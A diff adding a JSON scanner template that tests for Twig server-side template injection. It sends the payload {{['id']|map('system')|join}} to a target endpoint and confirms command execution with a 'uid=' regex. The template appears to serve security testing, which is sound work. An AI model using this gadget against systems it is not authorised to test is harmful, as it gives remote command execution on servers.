@@ -1,0 +1,26 @@
+{
+  "name": "web/Twig SSTI RCE map-system gadget",
+  "description": "[god] Twig SSTI to RCE via the map/system gadget (CWE-1336; PayloadsAllTheThings SSTI — filter/map accept callables since Twig 1.41): {{['id']|map('system')|join}} runs the command and joins the output into the rendered page. Keywords: twig ssti rce map filter system gadget template injection. ctrl: benign render echoes input literally -> not falsified. base_url = endpoint reflecting user input into a rendered template.",
+  "cwe": "CWE-1336",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/?name={{['id']|map('system')|join}}"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "uid=\\d+\\("
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "dd7b71531056",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
